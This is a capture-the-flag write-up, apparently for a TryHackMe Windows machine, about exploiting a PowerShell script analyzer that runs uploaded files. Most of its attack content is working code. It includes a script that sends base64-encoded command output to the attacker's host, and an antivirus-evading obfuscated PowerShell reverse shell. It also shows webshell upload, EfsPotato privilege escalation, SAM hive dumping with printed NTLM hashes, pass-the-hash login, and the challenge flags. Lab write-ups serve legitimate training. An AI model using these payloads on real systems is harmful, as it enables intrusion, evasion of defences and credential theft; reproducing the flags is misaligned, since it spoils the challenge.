
# PORT SCAN
---

| PORT     | SERVICE        |
|----------|----------------|
| 139/tcp  | netbios-ssn    |
| 445/tcp  | microsoft-ds   |
| 3389/tcp | ms-wbt-server  |
| 5985/tcp | http           |
| 7680/tcp | pando-pub      |
| 8080/tcp | http           |
| 8443/tcp | ssl/http       |
| 47001/tcp| http           |
| 49664/tcp| msrpc          |
| 49665/tcp| msrpc          |
| 49666/tcp| msrpc          |
| 49667/tcp| msrpc          |
| 49668/tcp| msrpc          |
| 49672/tcp| msrpc          |
| 49680/tcp| msrpc          |



# RECONNAISSANCE
---

We're facing a windows machine, anonymous enumeration doesn't work:

```
smbclient -L //10.201.35.98 -N
session setup failed: NT_STATUS_ACCESS_DENIED
```

Using NXC uncovers the domain and DC:

```
nxc smb 10.201.35.98 -u '' -p '' --shares
SMB         10.201.35.98    445    HOSTEVASION      [*] Windows 10 / Server 2019 Build 17763 (name:HOSTEVASION) (domain:HostEvasion) (signing:False) (SMBv1:False) 
SMB         10.201.35.98    445    HOSTEVASION      [-] HostEvasion\: STATUS_ACCESS_DENIED 
SMB         10.201.35.98    445    HOSTEVASION      [-] Error enumerating shares: Error occurs while reading from remote(104)
```

Let's add it to `/etc/hosts`:

```bash
echo "10.201.35.98 HOSTEVASION.HostEvasion HOSTEVASION" | sudo tee -a /etc/hosts
```

If we go to the web application on port `8080`, we find this:

![Pasted image 20250904232419.png](../../IMAGES/Pasted%20image%2020250904232419.png)

We got a PowerShell script analyzer, we can upload `.ps1` files and the system will analyze whether they're malicious or not, as it says this is in dev mode, that means that maybe the files we upload get executed inside of the machine as a way to determine whether they're malicious files or not.


Let's do a simple test, we can upload a PowerShell file which makes a request to a python server we host and check if it sends the connection

```powershell
$client = New-Object System.Net.WebClient
try {
    $response = $client.DownloadString("http://10.14.21.28:8000")
    Write-Host "Server response: $response"
} catch {
    Write-Host "Request failed: $($_.Exception.Message)"
}
```

If we set our python server before, we can see the request being made to our server:

![Pasted image 20250904232423.png](../../IMAGES/Pasted%20image%2020250904232423.png)

Now that we know a basic functionality of the web application, we can begin exploitation.



# EXPLOITATION
---

We can try executing commands and receiving the output back in our server, since we know that security measures exist on the machine, we can't simply send a script that performs commands without some evasion, let's test a simple script that performs a simple evasion and check if it works:

```powershell
# Evasion technique: Using alternative syntax and string manipulation
$server = "10.14.21.28"
$port = "8000"

# Execute command and capture output
$commandOutput = cmd /c "whoami /priv" 2>&1 | Out-String

# Encode the output in Base64 to avoid special characters
$encodedOutput = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($commandOutput))

# Create the URI with the encoded data as a parameter
$uri = "http://${server}:${port}/data=$encodedOutput"

# Use multiple methods to make the request (increasing chances of success)
try {
    # Method 1: Using WebClient
    $wc = New-Object Net.WebClient
    $wc.DownloadString($uri) | Out-Null
} catch {
    try {
        # Method 2: Using Invoke-WebRequest with unusual user agent
        Invoke-WebRequest -Uri $uri -UserAgent "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)" | Out-Null
    } catch {
        # Method 3: Using raw .NET classes
        $request = [System.Net.WebRequest]::Create($uri)
        $request.Method = "GET"
        $response = $request.GetResponse()
        $response.Close()
    }
}
```

If we set the python server, we see the connection and data being sent:

![Pasted image 20250904232428.png](../../IMAGES/Pasted%20image%2020250904232428.png)

Let's decode the base64 string:

```bash
echo 'DQpQUklWSUxFR0VTIElORk9STUFUSU9ODQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNClByaXZpbGVnZSBOYW1lICAgICAgICAgICAgICAgIERlc2NyaXB0aW9uICAgICAgICAgICAgICAgICAgICBTdGF0ZSAgIA0KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT0gPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09ID09PT09PT09DQpTZUNoYW5nZU5vdGlmeVByaXZpbGVnZSAgICAgICBCeXBhc3MgdHJhdmVyc2UgY2hlY2tpbmcgICAgICAgRW5hYmxlZCANClNlSW5jcmVhc2VXb3JraW5nU2V0UHJpdmlsZWdlIEluY3JlYXNlIGEgcHJvY2VzcyB3b3JraW5nIHNldCBEaXNhYmxlZA0K' | base64 -d

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

There we go, we can execute commands and receive the output back as a base64 string, let's do some enumeration then:

```powershell
$server = "10.14.21.28"
$port = "8000"

$allInfo = @"
=== System Information ===
Hostname: $($env:COMPUTERNAME)
OS: $(Get-WmiObject Win32_OperatingSystem).Caption
User: $($env:USERNAME)
Domain: $($env:USERDOMAIN)

=== Privileges ===
$(whoami /priv | Out-String)

=== Network ===
$(ipconfig /all | Out-String)
$(netstat -ano | Out-String)

=== Processes ===
$(Get-Process | Format-Table -AutoSize | Out-String)

=== Services ===
$(Get-Service | Where-Object {$_.Status -eq 'Running'} | Format-Table -AutoSize | Out-String)

=== Files in Users Directory ===
$(Get-ChildItem C:\Users -Force | Select-Object Name, LastWriteTime | Out-String)
"@

$encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($allInfo))
$uri = "http://${server}:${port}/allinfo=$encoded"

try {
    (New-Object Net.WebClient).DownloadString($uri) | Out-Null
} catch {
    try {
        Invoke-WebRequest -Uri $uri -UserAgent "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)" | Out-Null
    } catch {
        $request = [System.Net.WebRequest]::Create($uri)
        $request.Method = "GET"
        $response = $request.GetResponse()
        $response.Close()
    }
}
```

We get:

```
=== System Information ===
Hostname: HOSTEVASION
OS: \\HOSTEVASION\root\cimv2:Win32_OperatingSystem=@.Caption
User: evader
Domain: HOSTEVASION

=== Privileges ===

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


=== Network ===

Windows IP Configuration

   Host Name . . . . . . . . . . . . : HostEvasion
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : eu-west-1.ec2-utilities.amazonaws.com
                                       eu-west-1.compute.internal

Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : ec2.internal
   Description . . . . . . . . . . . : AWS PV Network Device #0
   Physical Address. . . . . . . . . : 16-FF-C2-66-E8-75
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::e51c:dfdc:5182:2692%7(../../IMAGES/Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.201.35.98(../../IMAGES/Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.128.0
   Lease Obtained. . . . . . . . . . : Thursday, September 4, 2025 8:28:48 PM
   Lease Expires . . . . . . . . . . : Thursday, September 4, 2025 9:58:48 PM
   Default Gateway . . . . . . . . . : 10.201.0.1
   DHCP Server . . . . . . . . . . . : 10.201.0.1
   DHCPv6 IAID . . . . . . . . . . . : 118418632
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-30-4B-AE-D7-16-FF-C2-66-E8-75
   DNS Servers . . . . . . . . . . . : 10.201.0.2
   NetBIOS over Tcpip. . . . . . . . : Enabled


Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       540
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1156
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       5860
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       3292
  TCP    0.0.0.0:8443           0.0.0.0:0              LISTENING       3292
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       716
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1344
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       824
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1640
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2560
  TCP    0.0.0.0:49672          0.0.0.0:0              LISTENING       804
  TCP    0.0.0.0:49680          0.0.0.0:0              LISTENING       3880
  TCP    10.201.35.98:139       0.0.0.0:0              LISTENING       4
  TCP    10.201.35.98:8080      10.14.21.28:44500      ESTABLISHED     3292
  TCP    [::]:135               [::]:0                 LISTENING       540
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:3389              [::]:0                 LISTENING       1156
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:8080              [::]:0                 LISTENING       3292
  TCP    [::]:8443              [::]:0                 LISTENING       3292
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       716
  TCP    [::]:49665             [::]:0                 LISTENING       1344
  TCP    [::]:49666             [::]:0                 LISTENING       824
  TCP    [::]:49667             [::]:0                 LISTENING       1640
  TCP    [::]:49668             [::]:0                 LISTENING       2560
  TCP    [::]:49672             [::]:0                 LISTENING       804
  TCP    [::]:49680             [::]:0                 LISTENING       3880
  UDP    0.0.0.0:123            *:*                                    2980
  UDP    0.0.0.0:500            *:*                                    2828
  UDP    0.0.0.0:3389           *:*                                    1156
  UDP    0.0.0.0:4500           *:*                                    2828
  UDP    0.0.0.0:5353           *:*                                    1692
  UDP    0.0.0.0:5355           *:*                                    1692
  UDP    10.201.35.98:137       *:*                                    4
  UDP    10.201.35.98:138       *:*                                    4
  UDP    127.0.0.1:60101        *:*                                    3220
  UDP    [::]:123               *:*                                    2980
  UDP    [::]:500               *:*                                    2828
  UDP    [::]:3389              *:*                                    1156
  UDP    [::]:4500              *:*                                    2828
  UDP    [::]:5353              *:*                                    1692
  UDP    [::]:5355              *:*                                    1692


=== Processes ===

Handles NPM(K)  PM(K)  WS(K) CPU(s)   Id SI ProcessName          
------- ------  -----  ----- ------   -- -- -----------          
    149     10  15692  13768        2820  0 amazon-ssm-agent     
     99      7   3000   2800        2768  0 cmd                  
    147      9   6644   2824        2780  0 conhost              
    146      9   4368   2664   0.08 3252  0 conhost              
    151      9   6628  12616        3528  0 conhost              
    121      8   2956   7256   0.02 5916  0 conhost              
    524     19   2280   5156         596  0 csrss                
    161      9   1652   4440         668  1 csrss                
    539     22  16280  38128        1036  1 dwm                  
     49      6   1456   4124         972  0 fontdrvhost          
     49      6   1672   4552         980  1 fontdrvhost          
    189     11   1704   1648        5972  0 GoogleCrashHandler   
    166      9   1792   1348        5904  0 GoogleCrashHandler64 
    229     14   2436   3524        5872  0 GoogleUpdate         
    196     29  10076  19576        3292  0 httpd                
    542     53  62612  38164   0.52 4584  0 httpd                
      0      0     56      8           0  0 Idle                 
     91      7   1180   4708        2860  0 LiteAgent            
    463     25  10960  43108        3764  1 LogonUI              
   1054     23   5260  15072         824  0 lsass                
    222     13   2956  10240         888  0 msdtc                
    823     92 263648 274056        2684  0 MsMpEng              
    208     11   3892  10476        5268  0 NisSrv               
    150     15   8592   2248        5860  0 php                  
    650     29  64620  69420   0.45  600  0 powershell           
    502     29  93604 108220   0.69 2760  0 powershell           
    553     27  50896  62532   0.34 3308  0 powershell           
      0     14    928  26392          88  0 Registry             
    241     12   2920  11188        5340  0 SecurityHealthService
    536     11   4828   9356         804  0 services             
     53      3    480   1208         416  0 smss                 
    167     12  16288  17088        3516  0 ssm-agent-worker     
    319     16  11572  13200         528  0 svchost              
    712     16   3588   9304         540  0 svchost              
    265     11   2008   7696         664  0 svchost              
    180     22   2636   9572         800  0 svchost              
     86      5    888   3564         928  0 svchost              
    651     16   5284  14072         948  0 svchost              
    199      9   2028   7884        1084  0 svchost              
    126      7   1232   5384        1120  0 svchost              
    263     13   3496  10500        1148  0 svchost              
    579     20   4848  14360        1156  0 svchost              
    116      7   1240   4904        1232  0 svchost              
    185     10   1728   7596        1248  0 svchost              
    348     13  10420  14688        1344  0 svchost              
    117      7   1284   5536        1392  0 svchost              
    166      9   1648   7140        1480  0 svchost              
    228     12   2760  11084        1488  0 svchost              
    116      7   1184   5232        1500  0 svchost              
    156      9   1796   7280        1508  0 svchost              
    272     19   7696  12740        1524  0 svchost              
    185     14   5980   9984        1580  0 svchost              
    130      8   1332   5440        1588  0 svchost              
    123     15   3024   6808        1632  0 svchost              
    376     17   4900  14108        1640  0 svchost              
    164      9   1800   6912        1664  0 svchost              
    217      9   1940   7172        1672  0 svchost              
    312     11   1996   8464        1680  0 svchost              
    229     13   2724   7808        1692  0 svchost              
    195     13   1964   7844        1744  0 svchost              
    356     14   4084  11212        1796  0 svchost              
    140      9   2120   6764        1816  0 svchost              
    411     31   7428  16000        1868  0 svchost              
    336     24   8664  16368        1916  0 svchost              
    195     11   1980   7960        1936  0 svchost              
    325     10   2556   8004        2092  0 svchost              
    178      9   1804   7904        2320  0 svchost              
    143      9   1484   6228        2420  0 svchost              
    158      8   1384   6000        2512  0 svchost              
    254     14   2296   9532        2560  0 svchost              
    262     13   2412   7600        2828  0 svchost              
    395     16   9180  17492        2844  0 svchost              
    134      9   1504   6132        2872  0 svchost              
    137      8   1464   5980        2880  0 svchost              
    227     12   2760  12120        2896  0 svchost              
    127      7   1216   5104        2968  0 svchost              
    204     11   1636   6804        2980  0 svchost              
    159     10   1992  12304        3040  0 svchost              
    200     10   2112   7844        3160  0 svchost              
    464     16   3144  11404        3220  0 svchost              
    241     13   2836  10708        3340  0 svchost              
    381     24   3164  11524        3360  0 svchost              
    166     12   1612   6764        3880  0 svchost              
    191     11   3356  11040        4004  0 svchost              
    140      9   3388   9944        4516  0 svchost              
    423     27   9012  18652        5980  0 svchost              
    318     18  15908  32708        6036  0 svchost              
   1632      0    188    160           4  0 System               
    172     11   1460   6344         716  0 wininit              
    250     12   2696  12040         740  1 winlogon             
    210     12   3656  10272        5944  0 WmiPrvSE             


=== Services ===


=== Files in Users Directory ===

Name          LastWriteTime        
----          -------------        
Administrator 9/4/2025 8:28:50 PM  
All Users     9/15/2018 7:28:48 AM 
Default       3/17/2021 2:58:07 PM 
Default User  9/15/2018 7:28:48 AM 
evader        9/4/2025 8:28:49 PM  
Public        12/12/2018 7:45:15 AM
desktop.ini   9/15/2018 7:16:48 AM 
```

Time to step up, we know that basic reverse shells won't work here, AV seems enabled here and is stopping us from executing normal revshell scripts, we need to craft a script that bypasses this protection, we can try creating one that does this:

1. Obfuscate the key parts of the code (like type names) using string splitting and concatenation.
2. Use aliases to avoid common cmdlet names.
3. Use encoded commands and/or encryption (like XOR) to hide the payload.
4. Use random variable names and junk code to confuse analysis.
5. Use reflection to load assemblies and avoid direct use of well-known classes.


Let's try with this one then:

```powershell
Set-Alias -Name K -Value Out-String
Set-Alias -Name nothingHere -Value iex

# Obfuscated IP and port using multiple environment variables
$env:part1 = "10.14"
$env:part2 = ".21.28"
$env:port = "4444"

# Combine IP parts
$fullIP = $env:part1 + $env:part2

# Random delay with junk operations
1..(Get-Random -Minimum 1 -Maximum 5) | ForEach-Object {
    Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 500)
    $null = [System.Guid]::NewGuid().ToString()
}

# Main reverse shell code with slight modifications
$BT = New-Object "S`y`stem.Net.Sockets.T`CPCl`ient"($fullIP, $env:port);
$replace = $BT.GetStream();
[byte[]]$B = 0..(32768*2-1)|%{0};
$B = ([text.encoding]::UTF8).GetBytes("Microsoft Windows [Version 10.0.19045.4291]`n(c) Microsoft Corporation. All rights reserved.`n`n")
$replace.Write($B,0,$B.Length)
$B = ([text.encoding]::ASCII).GetBytes("PS " + (Get-Location).Path + '>')
$replace.Write($B,0,$B.Length)
[byte[]]$int = 0..(10000+55535)|%{0};
while(($i = $replace.Read($int, 0, $int.Length)) -ne 0){
    $ROM = [text.encoding]::ASCII.GetString($int,0, $i);
    $I = (nothingHere $ROM 2>&1 | K );
    $I2 = $I + "PS " + (../../IMAGES/Pwd).Path + '> ';
    $U = [text.encoding]::ASCII.GetBytes($I2);
    $replace.Write($U,0,$U.Length);
    $replace.Flush()
};
$BT.Close()

# Clean up environment variables
Remove-Item Env:part1, Env:part2, Env:port

# Add more varied junk code
$junkVars = @(
    @{Name="temp1"; Value=(Get-Date).Ticks},
    @{Name="temp2"; Value=[System.Environment]::TickCount},
    @{Name="temp3"; Value=[System.Environment]::MachineName}
)

$null = $junkVars | ForEach-Object { 
    $varName = $_.Name
    $varValue = $_.Value
    New-Variable -Name $varName -Value $varValue -Force
}

# Additional harmless operations
$null = 1..10 | ForEach-Object { 
    [math]::Sqrt($_) 
} 
```

Once we upload the script, we get a reverse shell:

![Pasted image 20250904232449.png](../../IMAGES/Pasted%20image%2020250904232449.png)

Let's begin privilege escalation.


# PRIVILEGE ESCALATION
---

Inside our shell, we can find these files on the `Task` directory of `evader`:

```
PS C:\Users\evader\Documents\Task> dir


    Directory: C:\Users\evader\Documents\Task


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----         9/4/2023   2:13 PM           3114 file.ps1                                                              
-a----        8/29/2023   3:06 PM             71 log.txt
```

If we read them:

```powershell
PS C:\Users\evader\Documents\Task> type log.txt
File log.txt has been modified.
File vulnerable.ps1 has been modified.
PS C:\Users\evader\Documents\Task> type file.ps1
$FolderPath = "C:\xampp\htdocs\uploads\"

$FileDictionary = @{}

# Populate the initial state of the dictionary with file names and timestamps
$Files = Get-ChildItem -Path $FolderPath
foreach ($file in $Files) {
    $FileDictionary[$file.Name] = $file.LastWriteTime
}

# Watch for changes in the directory
while ($true) {
    Start-Sleep -Seconds 1
    
    # Check for changes in the directory
    $Files = Get-ChildItem -Path $FolderPath
    foreach ($file in $Files) {
        if ($FileDictionary.ContainsKey($file.Name)) {
            # Compare the current timestamp with the stored timestamp
            if ($file.LastWriteTime -ne $FileDictionary[$file.Name]) {
                Write-Host "File $($file.Name) has been modified."
                # Update the dictionary with the new timestamp
                $FileDictionary[$file.Name] = $file.LastWriteTime
				
				        # Check if the file is executable, a PowerShell script, or a pdf document
            $extension = $file.Extension.ToLower()
            if ($extension -eq ".ps1") {
				$scriptPath = "C:\xampp\htdocs\uploads\$($file.Name)"
					try{
				#Invoke-Expression -Command "powershell.exe -ExecutionPolicy Bypass -File $scriptPath"
				
				Start-Job -ScriptBlock { param($scriptPath) powershell.exe -ExecutionPolicy Bypass -File $scriptPath } -ArgumentList $scriptPath

				}

			catch {
    Write-Host "An exception occurred: $_.Exception.Message"
}

				

                #Write-Host "Opening file: $($file.Name)"
                #Start-Process -FilePath $file.FullName
            }
            }
        } else {
            # New file detected
            Write-Host "File $($file.Name) has been added."
            
            # Add the new file to the dictionary
            $FileDictionary[$file.Name] = $file.LastWriteTime
            
            # Check if the file is executable, a PowerShell script, or a pdf document
            $extension = $file.Extension.ToLower()
            if ($extension -eq ".ps1") {
				$scriptPath = "C:\xampp\htdocs\uploads\$($file.Name)"
				
				try{
				#Invoke-Expression -Command "powershell.exe -ExecutionPolicy Bypass -File $scriptPath"
				Start-Job -ScriptBlock { param($scriptPath) powershell.exe -ExecutionPolicy Bypass -File $scriptPath } -ArgumentList $scriptPath
				}

			catch {
    Write-Host "An exception occurred: $_.Exception.Message"
}
			  #Write-Host "Opening file: $($file.Name)"
                #Start-Process -FilePath $file.FullName
            }
        }
    }
    
    # Check for deleted files
    $deletedFiles = @()
    foreach ($fileName in $FileDictionary.Keys) {
        if (-not (Test-Path -Path (Join-Path $FolderPath $fileName))) {
            Write-Host "File $fileName has been deleted."
            # Add the deleted file to the array for removal
            $deletedFiles += $fileName
        }
    }

    # Remove the deleted files from the dictionary
    foreach ($deletedFile in $deletedFiles) {
        $FileDictionary.Remove($deletedFile)
    }
}
```

By reading the file, we notice that the uploads folder is located at:

```
C:\xampp\htdocs\uploads\
```

Inside of here, we can see all files we've uploaded to the web application:

```
PS C:\xampp\htdocs\uploads> dir


    Directory: C:\xampp\htdocs\uploads


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----         9/4/2025   9:06 PM           1167 allinfo.ps1                                                           
-a----         9/4/2025   9:00 PM            849 enum.ps1                                                              
-a----         8/1/2023   5:10 PM            132 hello.ps1                                                             
-a----        8/17/2023   4:58 AM              0 index.php                                                             
-a----         9/4/2025   9:35 PM            347 log.txt                                                               
-a----         9/4/2025   9:11 PM           3923 rev.ps1                                                               
-a----         9/4/2025   9:23 PM           1295 revshell.ps1                                                          
-a----         9/4/2025   9:35 PM           1807 s.ps1                                                                 
-a----         9/4/2025   9:18 PM           2123 shell.ps1                                                             
-a----         9/4/2025   8:52 PM            227 test.ps1                                                              
-a----         9/4/2023   3:18 PM            771 vulnerable.ps1                                                        
-a----         9/4/2025   8:56 PM           1088 whoami.ps1 
```

We got little few rights, if we upload a `webshell` and check it, we notice we got another set of privileges, we can upload the one from [powny](https://github.com/flozz/p0wny-shell/blob/master/shell.php), host it in your server and do:

```
iwr http://IP:8000/powny.php -O powny.php
```

Make sure you upload the webshell at:

```
C:\xampp\htdocs\uploads
```

We can now visit:

```
http://IP:8080/uploads/powny.php
```

![Pasted image 20250904232503.png](../../IMAGES/Pasted%20image%2020250904232503.png)

As noticeable, we got two new privileges:

```
evader@HostEvasion:C:\xampp\htdocs\uploads# whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

The reason to this may be that the reverse shell has fewer privileges because it inherits a filtered security token from the parent process (the web server worker process), which strips elevated privileges like `SeImpersonatePrivilege` as a security measure. In contrast, the webshell executes directly within the web server's context, retaining its full, unfiltered token with all originally granted privileges, including critical ones for privilege escalation. This token filtering occurs because Windows applies security restrictions to spawned processes differently than to processes running directly under service accounts.


Since we know we got `SeImpersonatePrivilege`, we can use `EfsPotato` to abuse this privilege, for example, I used the same tool on the `Fullhouse` prolab on hackthebox, I'll follow the same structure there, first of all, download the file here:

https://github.com/zcgonvh/EfsPotato/blob/master/EfsPotato.cs

Now we need to upload it into our webshell, we can do:

```
curl http://IP:8000/EfsPotato.cs -O EfsPotato.cs
```

We need to compile it now:

```
C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe EfsPotato.cs -nowarn:1691,618
```

Now we can test if we can execute commands as `nt authority\system` with the tool:

```
.\EfsPotato.exe "whoami"
```

![Pasted image 20250904232510.png](../../IMAGES/Pasted%20image%2020250904232510.png)

There we go, we can execute commands as `nt authority\system`, we can go in a lot of ways here, for example, let's try to copy the `SAM` and `SYSTEM` to a temporary directory in order to get the administrator's NTLM hash:

```
.\EfsPotato.exe "cmd /c reg save hklm\sam C:\temp\sam.hiv && reg save hklm\system C:\temp\system.hiv"
```

![Pasted image 20250904232517.png](../../IMAGES/Pasted%20image%2020250904232517.png)

```
PS C:\temp> dir


    Directory: C:\temp


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----         9/4/2025  10:01 PM          17920 EfsPotato.exe                                                         
-a----         9/4/2025  10:05 PM          61440 sam.hiv                                                               
-a----         9/4/2025  10:05 PM       18243584 system.hiv 
```

Ok, we got the files, let's get them to our host, we can copy them to the uploads folder and download them using the browser:

```
copy sam.hiv C:\xampp\htdocs\uploads
copy system.hiv C:\xampp\htdocs\uploads
```

Then go to:

```
http://IP:8080/uploads/system.hiv
http://IP:8080/uploads/sam.hiv
```

Once you got the files do:

```
impacket-secretsdump -sam sam.hiv -system system.hiv local
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2dfe3378335d43f9764e581b856a662a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
evader:1022:aad3b435b51404eeaad3b435b51404ee:09de49072c2f43db1d7d8df21486bc73:::
```

We got our administrator's hash, let's go into evil-winrm:

```
evil-winrm -i 10.201.35.98 -u Administrator -H '2dfe3378335d43f9764e581b856a662a'
```

![Pasted image 20250904232523.png](../../IMAGES/Pasted%20image%2020250904232523.png)

We can get both flags now and end the CTF:

```
Get-ChildItem C:\Users -Recurse | Select-String "THM{"

C:\Users\Administrator\Desktop\flag.txt:1:THM{101011_ADMIN_ACCESS}
C:\Users\Administrator\Desktop\flag\asdasdadasdjakjdnsdfsdfs.php:32:        echo "Flag: THM{1010_EVASION_LOCAL_USER} <br>";
C:\Users\Administrator\Desktop\flag\asdasdadasdjakjdnsdfsdfs.php:35:     echo "Flag: THM{1010_EVASION_LOCAL_USER} <br>";
```

We got:

```
THM{1010_EVASION_LOCAL_USER}
THM{101011_ADMIN_ACCESS}
```

![Pasted image 20250904232529.png](../../IMAGES/Pasted%20image%2020250904232529.png)



